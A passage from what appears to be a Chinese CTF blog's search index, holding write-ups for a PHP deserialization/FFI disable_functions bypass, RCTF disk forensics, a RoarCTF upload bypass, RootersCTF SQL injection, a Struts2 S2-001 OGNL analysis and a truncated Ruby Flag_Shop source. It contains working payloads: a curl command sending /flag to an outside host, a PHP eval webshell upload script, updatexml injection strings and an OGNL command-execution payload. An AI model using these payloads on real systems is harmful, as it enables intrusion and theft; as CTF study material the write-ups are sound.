function unserialize($payload) &#123;//这个也是可以自定义触发run方法        $this-&gt;data = unserialize($payload);        $this-&gt;run();    &#125;    public function __get ($key) &#123;        return $this-&gt;data[$key];    &#125;    public function __set ($key, $value) &#123;        throw new \\Exception(&#x27;No implemented&#x27;);    &#125;    public function __construct () &#123;        throw new \\Exception(&#x27;No implemented&#x27;);    &#125;&#125;\n\n这是一个反序列化漏洞，run那个方法可以进行函数执行，我们可以结合index.php中的eval进行。但是还有个难点就是我们无法用system去绕过Open_basedir，我们必须先绕过Open_basedir或者disable_function\n这个代码实现了一个Serializable接口，然后可以自定义serialize和unserialize进行触发run()方法去函数执行\n但是这个代码中同时出现了__serialize方法和serialize，在php7.4以后就使用__serialize代替\n如果一个类同时实现了Serializable和__Serialize（）&#x2F;__Unserialize（），则序列化将倾向于使用新机制，而非序列化则可以使用其中一种机制，具体取决于使用的是C（Serializable）还是O（Uu unserialize）格式。因此，以C格式编码的旧的序列化字符串仍然可以解码，而新的字符串将以O格式生成。\n序列化时（新字符串生成）：\n\n当类同时实现两种机制时，PHP 优先使用 __serialize()&#x2F;__unserialize() 新机制\n原因：\n设计意图：新机制是更现代的替代方案\n功能更强：新方法可以返回数组，更灵活\n未来兼容：鼓励迁移到新机制\n\n\n\n反序列化时（解码旧字符串）：\n\nPHP 会根据序列化字符串中的标记决定使用哪种机制：\n如果字符串是 C 格式（旧格式），使用 Serializable 的 unserialize()\n如果是 O 格式（新格式），使用 __unserialize()\n\n\n原因：\n向后兼容：确保旧的序列化字符串仍能正确解码\n数据一致性：序列化和反序列化方式必须匹配\n\n\n\n然后wp中使用的是ffi.cdef\n如果ffi.cdef没有第二个参数，会在全局查找，第一个参数所声明的符号。意思就是其在不传入第二个参数时，可以直接调用php代码。所以我们在声明后，即可加入php代码\n我们最后利用的是ffi.cdef去实现一个函数执行\n如果我们要调用C标准库里面的system函数（先不考虑PHP自己实现了system函数），我们就使用cdef去加载，cdef会把存放system函数功能的动态链接库libc加载到内存里面，这样PHP的进程空间里就有了这个system，这也是disable_functions里面过滤了system函数，但是结果的payload里面仍然还使用了system的原因，因为我们是加载c库函数中的system函数的\n动态链接库里面有符号表，函数名称表，存储着函数名称对应的函数机器码地址。当cdef的参数写上函数原型之后，他就可以通过这个方式找到动态链接库里面对应的函数地址：cdef的第一个参数函数原型告诉他这个函数叫啥名字，参数列表，返回值类型，这样他就会按照一定的命名规范将其转化为system在libc库里面的符号并以此进行查找\n直接来看exp\n&lt;?phpfinal class A implements Serializable &#123;    protected $data = [        &#x27;ret&#x27; =&gt; null,        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,                                  &#x27;arg&#x27; =&gt; &#x27;int system(const char *command);&#x27;     //声明    ];    public function serialize (): string &#123;        return serialize($this-&gt;data);    &#125;    public function unserialize($payload) &#123;        $this-&gt;data = unserialize($payload);    &#125;&#125;$a = new A();$b = serialize($a);echo $b;//C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;\n\n我们可以先来看看run方法\nprivate function run () &#123;        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);    &#125;\n\n发现这里面只用arg一个参数，我们再回头看线FFI::cdef中\nFFI::cdef() 是 PHP FFI (Foreign Function Interface) 扩展中的核心方法，用于声明要调用的外部 C 函数和数据结构。\npublic static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null): FFI\n\n参数说明\n\n$code (字符串):\nC 语言声明代码，包含函数原型、结构体、枚举等定义\n可以包含多个声明，用分号或换行分隔\n可以为空字符串\n\n\n$lib (可选字符串):\n要加载的共享库文件名\n如果为 null 或省略，则在全局符号表中查找\n\n\n\n如果ffi.cdef没有第二个参数，会在全局查找，第一个参数所声明的符号。意思就是其在不传入第二个参数时，可以直接调用php代码。所以我们在声明后，即可加入php代码\n也就是说如果我们没写第二个参数，就会再全局符号表中查找\n全局符号表本质上是一个”地址簿”，它包含：\n\n所有已加载共享库导出的符号（函数和全局变量）\n主程序（如PHP解释器本身）导出的符号\n动态链接的扩展提供的符号\n\n也就是说我们可以调用php中的system函数，用这个方法逃过了disable_function的检验\n$ffi = FFI::cdef(&quot;    // 声明 zend_execute 函数（PHP 内部执行器）    void zend_execute(void);&quot;);// 调用 PHP 内部函数$ffi-&gt;zend_execute(); // 实际会触发 PHP 解释器的执行流程\n\n\n\npayload\n?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;curl -d @/flag linux靶机ip:8888&#x27;);\n\n先对我们的对象进行一个反序列化，然后调用__serialize去返回data数组，然后取出ret，即FFI::cdef(&quot;int system(const char *command);&quot;)，然后触发system函数进行curl外带\n还有应该是命令执行无回显需要使用curl外带\n\n\n这个题目利用的是FFI::cdef的一个漏洞，由于缺少第二个参数导致从全局符号中去调用system函数\n"},{"title":"[RCTF2019]disk","url":"/2025/12/25/RCTF2019-disk/","content":"[RCTF2019]disk附件下载下来是一个vmdk文件，我们尝试挂载发现有密码，猜是rctf，发现加载了一下又报错了\n使用010editor打开vmdk文件\n\n\n发现多个重复字符串，拿到flag的第一部分\nrctf&#123;unseCure_quick_form4t_vo1ume\n\n然后就是一个小技巧了，我们可以使用7z对vmdk文件进行解压，将其中的文件系统解压出来\n这里进行解法发现有一个FAT文件，是Windows的一个文件系统，可以直接尝试挂载\n\n\n我们猜测密码为rctf，不知道为什么这个时候就可以了\n挂载成功，其中有两个文件\n\n\n这张图片中没有什么可以使用的信息，password.txt中有\nPassword 2: RCTF2019You&#x27;re late... So sad\n\n我们得到第二个密码RCTF2019，尝试用这个去挂载那个vmdk文件，发现还是错的\n这里又学到了，对于同一个文件系统，可以有多个密码，不同的密码会有不同的结果\n于是我们尝试对0.fat再尝试一下挂载发现得到一个损坏的盘\n\n\n格式化就和普通的镜像没什么区别了，所以我们直接使用WinHex打开磁盘的功能打开，进行HexWin之后，工具，打开磁盘\n然后第二段flag我没有什么好的查找方法，估计就是出题人也知道不好找才放了很大一段，我只能说从头到尾划一段就可以看见了\n\n\n拿到第二段flag\n_and_corrupted_1nner_v0lume&#125;\n\nflag\nrctf&#123;unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume&#125;\n\n","tags":["Misc","磁盘取证","杂项"]},{"title":"[RoarCTF_2019]Simple_Upload","url":"/2025/09/10/RoarCTF-2019-Simple-Upload/","content":"[RoarCTF_2019]Simple_Upload &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123;    public function index()    &#123;        show_source(__FILE__);    &#125;    public function upload()    &#123;        $uploadFile = $_FILES[&#x27;file&#x27;] ;                if (strstr(strtolower($uploadFile[&#x27;name&#x27;]), &quot;.php&quot;) ) &#123;            return false;        &#125;                $upload = new \\Think\\Upload();// 实例化上传类        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小        $upload-&gt;allowExts  = array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpeg&#x27;);// 设置附件上传类型        $upload-&gt;rootPath = &#x27;./Public/Uploads/&#x27;;// 设置附件上传目录        $upload-&gt;savePath = &#x27;&#x27;;// 设置附件上传子目录        $info = $upload-&gt;upload() ;        if(!$info) &#123;// 上传错误提示错误信息          $this-&gt;error($upload-&gt;getError());          return;        &#125;else&#123;// 上传成功 获取上传文件信息          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#x27;file&#x27;][&#x27;savepath&#x27;].$info[&#x27;file&#x27;][&#x27;savename&#x27;] ;          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));        &#125;    &#125;&#125; \n\n代码非常简单，先是对我们上传文件进行了一个.php的过滤，然后就是通过ThinkPHP的Upload类进行一个白名单过滤，但是我在看大佬的博客时说这个白名单没用，因为Upload这个类中根本就没有allowExts这个属性。\n绕过waf上传文件\n虽然把.php给过滤掉了，但是大佬看Upload的源码的时候发现\nforeach ($files as $key =&gt; $file) &#123;    $file[&#x27;name&#x27;]  = strip_tags($file[&#x27;name&#x27;]);    if(!isset($file[&#x27;key&#x27;]))   $file[&#x27;key&#x27;]    =   $key;    /* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */    if(isset($finfo))&#123;        $file[&#x27;type&#x27;]   =   finfo_file ( $finfo ,  $file[&#x27;tmp_name&#x27;] );    &#125;\n\n对文件名使用了strip_tags函数\nstrip_tags() 是 PHP 中用于去除字符串中的 HTML 和 PHP 标签的内置函数。可以处理被&lt;&gt;包裹的内容\n也就是说我们在文件名中可以通过&lt;&gt;进行绕过\n\n\n直接上传文件\nimport  requestsurl = &quot;http://a6510898-3660-453c-ae9c-3259e2472aca.node5.buuoj.cn:81/index.php/home/index/upload&quot;files=&#123;&#x27;file&#x27;:(&#x27;1.&lt;&gt;php&#x27;,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;)&#125;r=requests.post(url=url,files=files)print(r.text)#&#123;&quot;url&quot;:&quot;\\/Public\\/Uploads\\/2025-09-10\\/68c11e3098c84.php&quot;,&quot;success&quot;:1&#125;\n\n但是不知道为什么上传的是webshell，但是返回的php文件访问是直接拿到flag\n还有需要注意的就是需要往/index.php/home/index/upload中上传文件，这个代码使用的是TP框架，会优先进行路由解析，所以我们需要按照/模块/控制器类/方法的解析方式，所以我们文件上传的实际上是home/Controller/InterController.class.php中的upload方法，也就是我们看到的代码，index.php则是入口文件\n条件竞争文件上传\n感觉这个才是预期解，绕过waf那个可能是出题人没仔细看源码结果被绕过了\n网上的博客都在说是ThinkPHP的Upload类中出现多个文件上传时的条件竞争漏洞(不知道有没有)。但是为什么我感觉这个题目和那个没什么关系，首先我们需要绕过的不是Upload中的waf，而是题目中对.php的过滤，不然Upload在默认不会主动过滤任何上传的后缀名。防御代码是需要我们自己去写的\n我认为真正的漏洞在于\n$uploadFile = $_FILES[&#x27;file&#x27;] ;if (strstr(strtolower($uploadFile[&#x27;name&#x27;]), &quot;.php&quot;) ) &#123;    return false;&#125;\n\n这个看似没有问题，但是当我们同时上传两个文件时\n$_FILES[&#x27;file&#x27;] = array(    &#x27;name&#x27; =&gt; array(        0 =&gt; &#x27;file1.php&#x27;,        1 =&gt; &#x27;image.jpg&#x27;,        2 =&gt; &#x27;test.php&#x27;    ),    &#x27;type&#x27; =&gt; array(        0 =&gt; &#x27;text/php&#x27;,        1 =&gt; &#x27;image/jpeg&#x27;,        2 =&gt; &#x27;text/php&#x27;    ),    &#x27;tmp_name&#x27; =&gt; array(        0 =&gt; &#x27;/tmp/phpABC.tmp&#x27;,        1 =&gt; &#x27;/tmp/phpDEF.tmp&#x27;,        2 =&gt; &#x27;/tmp/phpGHI.tmp&#x27;    ),    &#x27;error&#x27; =&gt; array(0, 0, 0),    &#x27;size&#x27; =&gt; array(123, 456, 789));\n\n也就是waf没有foreach变量数组，于是只会检查第一个上传的文件，我们可以同时上传一个txt和php文件让我们的php文件不被检查\n但是后面返回文件名的时候只会返回被检查了的文件名，也就是我们是不知道php的上传路径的，这个就需要进行爆破\n听大佬说我们随便上传一个文件通过文件名可以看出这是通过什么方式得到的文件名，这里用的是uniqid\n68c11e3098c84.php\n\nuniqid() 是 PHP 中用于生成唯一标识符的函数，基于当前时间的微秒数。\n也就是说我们同时上传的两个文件是基于时间的，前几位是一样的，但是至于是爆破几位我感觉爆破后两位即可\n\n\n先同时随便上传两个文件，第二个是php，然后爆破后两位。好吧，可能需要爆破后三位，但是三位需要爆四万多次，而且还把靶场给挤爆了都爆502了，就别折磨我了，理论成立实践算了。\n"},{"title":"[RootersCTF2019]babyWeb","url":"/2025/05/03/RootersCTF2019-babyWeb/","content":"[RootersCTF2019]babyWeb这个题目好无语，不知道为什么一开始报错，得等一下刷新才能看到题目\n题目是一个输入框，我们输入的东西会被拼接到sql语句当中\n\n\n我们直接就看到了列名和表名，这个记住可以直接解题\n提示说过滤掉了 \nunion sleep or &#x27; &quot; or - BENCHMARK\n\n我们无法使用联合注入，本以为or也是被过滤掉了information也不能用，但后面证实了information可以用，看了是用来匹配单独的or\nsql中||一般是作为字符串拼接符来处理，但是在mysql中||默认相当于or，作为字符串拼接符，需要设置 PIPES_AS_CONCAT SQL 模式\n也就是我们可以使用||进行报错注入了\n方法一\n#我们直接赌flag在这一列，直接上万能密码1 || 1=1 ##本来我觉得上面是可以的，但是题目好像有限制只能返回一行，我们需要使用limit1 || 1=1 limit 0,1 ##由于这次好像是数字没闭合，所以不用注释也可以\n\n\n\n方法二\n上面的方法应该不是预期解，我们应该使用报错注入的\nupdatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#users 由于引号被过滤掉了我们用16进制1|| (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 limit 0,1),0x7e),1))##我们就这么一步步注出来  但是有一个注意的地方就是这次输出需要匹配输出的行，每次只返回一行，但是报错注入回显字符数目有限，我们不用使用group_concat 这样会导致所有数据都在一行，和limit无法配合、(updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1)),1))##或者1|| (updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),10,10),0x7e),1))##group_concat 应该配合substr使用\n\n上面其实是爆数据库的表名和列名，但是题目回显不是给了我们一组表名和列名吗，我们直接用那个其实可以\n1 || (updatexml(1,concat(0x3a,(select uniqueid from users limit 0,1)),1))#\n\n\n\n把这行数字输入到输入框就能拿到flag\n"},{"title":"S2-001漏洞分析","url":"/2025/10/20/S2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"S2-001漏洞分析想学好Java漏洞，结果自己搭一个环境都花了好久\n1.漏洞复现漏洞复现教程\n我把自己搭建环境遇到的一些问题说一下，不然就忘了\nIDEA换源\n由于Maven的官方源在国外，而且我下载的时候SSL证书也出现了问题，所以只能换源方便一点，我们使用阿里云的Maven镜像源\nsettings.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;          xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;    &lt;mirrors&gt;        &lt;mirror&gt;            &lt;id&gt;aliyun-central&lt;/id&gt;            &lt;name&gt;Aliyun Central Mirror&lt;/name&gt;            &lt;url&gt;https://maven.aliyun.com/repository/central&lt;/url&gt;            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;/mirror&gt;    &lt;/mirrors&gt;&lt;/settings&gt;\n\n\n\n然后就是strust.xml的配置，我照着教程去做，可是会报错无法解析到jsp文件，但是我把其换为绝对路径后就不会报错了\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE struts PUBLIC        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;        &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;&lt;struts&gt;    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;login&quot; class=&quot;org.example.s2001.action.LoginAction&quot;&gt;            &lt;result name=&quot;success&quot; type=&quot;dispatcher&quot;&gt;/welcome.jsp&lt;/result&gt;            &lt;result name=&quot;error&quot;&gt;/index.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;\n\n\n\n然后就是不知道为什么我下载源代码的时候提示我找不到对应的源代码，莫非是阿里云的镜像中没有吗，搜了一下叫我把镜像删了，可是删了以后我也下载不了啊，也还是找不到源码\n\n\n看来只能使用反编译看一下了，大概意思应该差不多\n2.漏洞分析对于struts2框架的请求，我们可以看到其流程\n\n\n自己太菜了，还是老老实实的把这个流程过一遍吧\n1. 请求入口：Servlet Filters\n\nActionContextCleanUp  负责清理当前线程的 ActionContext 信息，防止内存泄漏。在多过滤器环境下（如与 SiteMesh 整合）很重要。\nFilterDispatcher（Struts 2.0~2.1）或 StrutsPrepareAndExecuteFilter（2.3+）  这是 Struts2 的核心入口，所有请求都会经过它。\n\n2. Struts 核心控制层\n\nActionMapper  将 HTTP 请求映射到具体的 Action（判断是否需要执行某个 Action）。\nConfiguration Manager  加载 struts.xml 及其他配置文件，管理 Struts2 的运行时配置。\nActionProxy  创建 Action 的代理对象，协调拦截器栈与 Action 的执行。\n\n至于ActionMapper往回传的那个是因为判断出来这个请求不应该由struts2进行处理\n3. 拦截器栈（Interceptors）——漏洞高发区\n这个就是我们代码审计的重点，我们看到拦截器分为两部分，中间由Action隔开，然后我们注意一下其实是进栈和出栈\n1. 预处理（Before Action）\n在 Action 方法执行之前工作，为 Action 的执行准备“上下文”和“数据”。\n\n参数处理：最经典的 ParametersInterceptor，它将 HTTP 请求中的参数自动提取并设置到 Action 的对应属性中。你不需要在 Action 里手动写 request.getParameter(&quot;name&quot;)。\n数据验证：ValidationInterceptor 根据你定义的规则（注解或XML）验证输入数据的合法性。\n工作流控制：WorkflowInterceptor 根据验证结果决定是继续执行 Action 还是跳转到“输入”页面。\n安全控制：自定义的 AuthenticationInterceptor 可以检查用户是否登录，是否有权限访问当前 Action。\n文件上传：FileUploadInterceptor 处理 multipart 表单，将上传的文件封装成方便操作的对象。\n\n然后经过Action，Action主要是对我们这个请求进行处理，是主要的业务逻辑的代码\n然后返回的结果回进行模板渲染\n2. 后处理（After Action）\n在 Action 方法执行之后、视图渲染之前&#x2F;之后工作，主要用于清理和收尾。\n\n资源清理：关闭数据库连接、清理线程局部变量（防止内存泄漏）。\n日志记录：记录 Action 执行的最终结果和耗时。\n数据加工：对 Action 执行后产生的数据进行最后的修饰。\n\n然后这是大佬的总结，感觉很生动\n\nHTTP请求经过一系列的过滤器，最后到达 FilterDispatcher 过滤器。\nFilterDispatcher 将请求转发 ActionMapper，判断该请求是否需要处理。\n如果该请求需要处理，FilterDispatcher会创建一个 ActionProxy 来进行后续的处理。\nActionProxy 拿着HTTP请求，询问 struts.xml 该调用哪一个 Action 进行处理。\n当知道目标Action之后，实例化一个ActionInvocation来进行调用。\n然后运行在Action之前的拦截器，图中就是拦截器1、2、3。\n运行Action，生成一个Result。\nResult根据页面模板和标签库，生成要响应的内容。\n根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。\n\n看完整个流程以后，框架的主要漏洞点就在拦截器中\n由上图工作流程我们可以看到，当一个 HTTP 请求被 Struts2 处理时，会经过一系列的 拦截器(Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如下图 struts.xml 中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。\n\n\n\n\n我们可以去struts-default.xml中找到拦截器栈\n\n\n在拦截器栈 defaultStack 中，我们需要关注 params 这个拦截器。其中， params拦截器 会将客户端请求数据设置到 值栈(valueStack) 中，后续 JSP 页面中所有的动态数据都将从值栈中取出。\n&lt;interceptor name=&quot;params&quot; class=&quot;com.opensymphony.xwork2.interceptor.ParametersInterceptor&quot;/&gt;\n\n然后我惊奇的发现，我这个过滤器和别人的不一样，我这个竟然把源码下载下来了，看来还是有一部分可以下载的\n\n\n这里将我们的输入入栈，在经过一系列的拦截器处理后，数据会成功进入实际业务 Action 。程序会根据 Action 处理的结果，选择对应的 JSP 视图进行展示，并对视图中的 Struts2 标签进行处理。如下图，在本例中 Action 处理用户登录失败时会返回 error \n我们之前再struts.xml中设置了Action\n&lt;action name=&quot;login&quot; class=&quot;org.example.s2001.action.LoginAction&quot;&gt;    &lt;result name=&quot;success&quot; type=&quot;dispatcher&quot;&gt;/welcome.jsp&lt;/result&gt;    &lt;result name=&quot;error&quot;&gt;/index.jsp&lt;/result&gt;\n\n然后返回不同的值时会渲染不同的jsp文件\nAction\n这是我们Action的代码\npackage org.example.s2001.action;import com.opensymphony.xwork2.ActionSupport;public class LoginAction extends ActionSupport&#123;    private String username = null;    private String password = null;    public String getUsername() &#123;        return this.username;    &#125;    public String getPassword() &#123;        return this.password;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;//正是使用set+字段名的方法名实现自动赋值    public String execute() throws Exception &#123;        if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123;            return &quot;error&quot;;        &#125;        if ((this.username.equalsIgnoreCase(&quot;admin&quot;))                &amp;&amp; (this.password.equals(&quot;admin&quot;))) &#123;            return &quot;success&quot;;        &#125;        return &quot;error&quot;;    &#125;&#125;\n\n拦截器会把栈中的输入传递给Action，然后我们的代码中除了用户名和密码输入都为admin的时候，其他都是返回error，无论返回什么，漏洞点主要在于Result对我们输入的处理\nResult\n执行完Action后会调用DefaultActionInvocation 的executeResult()处理请求结果，继续跟进\n\n\n会使用creatResult创建result然后调用execute进行处理\n不行，这个又不是必须要像反序列化那样把整个链子看完才能构造poc，我直接跳到最后的方法吧\n反正到最后就是\n\n\n其中this.altSyntax()会判断altSyntax是否开启，如果开启，则会调用translateVariables对参数值进行重新组合，该方法的作用是将变量转换为对象\n跟进TextParseUtil.translateVariables(&#39;%&#39;, expr, this.stack);\n    // com.opensymphony.xwork2.util.TextParseUtil#translateVariables    public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) &#123;        // deal with the &quot;pure&quot; expressions first!        //expression = expression.trim();        Object result = expression;        while (true) &#123;            int start = expression.indexOf(open + &quot;&#123;&quot;);            int length = expression.length();            int x = start + 2;            int end;            char c;            int count = 1;//从下标为2也就是%&#123;以后开始            while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;                c = expression.charAt(x++);                if (c == &#x27;&#123;&#x27;) &#123;                    count++;                &#125; else if (c == &#x27;&#125;&#x27;) &#123;                    count--;                &#125;            &#125;//获取表达式长度  循环完以后count为0，正常情况下            end = x - 1;//去掉&#125;            if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123;//有%&#123;&#125;表达式被解析就进入判断                String var = expression.substring(start + 2, end);//将我们%&#123;&#125;中的内容取出来                Object o = stack.findValue(var, asType);//然后进入findValue方法 然后将表达式执行结果返回给o ，这里也是表达式被解析的地方，命令执行触发点                if (evaluator != null) &#123;                \to = evaluator.evaluate(o);                &#125;                                String left = expression.substring(0, start);                String right = expression.substring(end + 1);                if (o != null) &#123;                    if (TextUtils.stringSet(left)) &#123;                        result = left + o;                    &#125; else &#123;                        result = o;                    &#125;                    if (TextUtils.stringSet(right)) &#123;                        result = result + right;                    &#125;                    expression = left + o + right;//这里变量result和expression获取到的值是一样的，只不过result用于返回最后的执行结果，express用于判断表达式是否需要继续解析                &#125; else &#123;                    // the variable doesn&#x27;t exist, so don&#x27;t display anything                    result = left + right;                    expression = left + right;                &#125;            &#125; else &#123;//如果没有%&#123;&#125;被解析就跳出循环，表达式解析结束                break;            &#125;        &#125;        return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);    &#125;\n\n我们可以看到，重点在于stack.findValue执行表达式，然后返回到o中然后触发循环继续，我们追踪stack.findValue\n    // com.opensymphony.xwork2.util.OgnlValueStack#findValue    public Object findValue(String expr, Class asType) &#123;        try &#123;            if (expr == null) &#123;                return null;            &#125;            if ((overrides != null) &amp;&amp; overrides.containsKey(expr)) &#123;                expr = (String) overrides.get(expr);            &#125;            Object value = OgnlUtil.getValue(expr, context, root, asType);//解析表达式            if (value != null) &#123;                return value;            &#125; else &#123;                return findInContext(expr);            &#125;        &#125; catch (OgnlException e) &#123;            return findInContext(expr);        &#125; catch (Exception e) &#123;            logLookupFailure(expr, e);            return findInContext(expr);        &#125; finally &#123;            OgnlContextState.clear(context);        &#125;    &#125;\n\n在这里，就可以看到OgnlUtil.getValue(expr, this.context, this.root, asType)，一个标准的OGNL取值表达式\n我们假设表达式是%&#123;1+6&#125;，我们来看一下解析流程\n//第一次循环//先传入表达式%&#123;username&#125;                String var = expression.substring(start + 2, end);//将我们%&#123;&#125;中的内容取出来 然后对username进行解析                Object o = stack.findValue(var, asType);//返回的是我们表单的输入%&#123;1+6&#125;\n\n可以看到进行OGNL解析的最初目的是为了通过上下文获取表单输入\n//第二次循环//获取到1+6 然后计算为7\n\n%&#123;1+6&#125;被解析后就没有OGNL表达式了，第三次循环直接break跳出循环了\n\n\n然后我们可以利用这个OGNL解析实现命令执行，弹个计算器\n%&#123;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc.exe&quot;&#125;)).start()&#125;\n\n\n\n这个漏洞的主要原因就是，想通过OGNL表达式解析username获取上下文变量，但是由于循环未控制好，只要有%&#123;&#125;就会一直解析，导致我们可以直接往username中写入%&#123;OGNL表达式&#125;就可以直接执行，然后修复代码就是，限制了循环次数\npublic static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) &#123;//可以通过这里设置最大循环次数    // deal with the &quot;pure&quot; expressions first!    //expression = expression.trim();    Object result = expression;    int loopCount = 1;    int pos = 0;    while (true) &#123;        int start = expression.indexOf(open + &quot;&#123;&quot;, pos);        if (start == -1) &#123;            pos = 0;            loopCount++;//每次循环都会增加            start = expression.indexOf(open + &quot;&#123;&quot;);        &#125;        if (loopCount &gt; maxLoopCount) &#123;            // translateVariables prevent infinite loop / expression recursive evaluation            break;        &#125;        int length = expression.length();        int x = start + 2;        int end;        char c;        int count = 1;        while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;            c = expression.charAt(x++);            if (c == &#x27;&#123;&#x27;) &#123;                count++;            &#125; else if (c == &#x27;&#125;&#x27;) &#123;                count--;            &#125;        &#125;        end = x - 1;        if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123;            String var = expression.substring(start + 2, end);            Object o = stack.findValue(var, asType);            if (evaluator != null) &#123;                o = evaluator.evaluate(o);            &#125;            String left = expression.substring(0, start);            String right = expression.substring(end + 1);            String middle = null;            if (o != null) &#123;                middle = o.toString();                if (!TextUtils.stringSet(left)) &#123;                    result = o;                &#125; else &#123;                    result = left + middle;                &#125;                if (TextUtils.stringSet(right)) &#123;                    result = result + right;                &#125;                expression = left + middle + right;            &#125; else &#123;                // the variable doesn&#x27;t exist, so don&#x27;t display anything                result = left + right;                expression = left + right;            &#125;            pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1: 0) +                  (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1: 0) +                  1;            pos = Math.max(pos, 1);        &#125; else &#123;            break;        &#125;    &#125;    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);&#125;\n\n"},{"title":"[SCTF2019]Flag_Shop","url":"/2025/04/27/SCTF2019-Flag-Shop/","content":"[SCTF2019]Flag_Shop也是做上难题了，难道要到一天一个题目的时代吗\n界面是一个交易界面\n\n\n我们点击，work可以增加金钱，但是光靠手点绝对不行，我们使用重发估计也不行\n看了大佬的wp，我们发现&#x2F;robots.txt，成功拿到源码\nrequire &#x27;sinatra&#x27;require &#x27;sinatra/cookies&#x27;require &#x27;sinatra/json&#x27;require &#x27;jwt&#x27;require &#x27;securerandom&#x27;require &#x27;erb&#x27;set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#x27;/shop&#x27;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    